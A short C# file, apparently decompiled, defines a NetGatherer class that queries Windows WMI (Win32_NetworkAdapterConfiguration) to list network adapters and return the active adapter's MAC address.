using NoiseMe.Drags.App.Models.WMI.Objects;
using System.Collections.Generic;

namespace NoiseMe.Drags.App.Data.WMI
{
	public static class NetGatherer
	{
		public static ICollection<NetworkAdapter> GetNetworkAdapter()
		{
			List<NetworkAdapter> list = new List<NetworkAdapter>();
			string[] properties = new string[4]
			{
				"Caption",
				"Description",
				"IPEnabled",
				"MacAddress"
			};
			WmiInstanceClassCollection wmiInstanceClassCollection = WmiInstance.Query("Win32_NetworkAdapterConfiguration", properties);
			if (wmiInstanceClassCollection == null)
			{
				return list;
			}
			foreach (WmiInstanceClass item2 in wmiInstanceClassCollection)
			{
				NetworkAdapter item = new NetworkAdapter((string)item2["Caption"].Value, (string)item2["Description"].Value, (bool?)item2["IPEnabled"].Value, (string)item2["MACAddress"].Value);
				list.Add(item);
			}
			return list;
		}

		public static string GetActiveMacAddress()
		{
			string property = "MACAddress";
			string condition = "IPEnabled = TRUE";
			return WmiInstance.PropertyQuery<string>("Win32_NetworkAdapterConfiguration", property, condition);
		}
	}
}
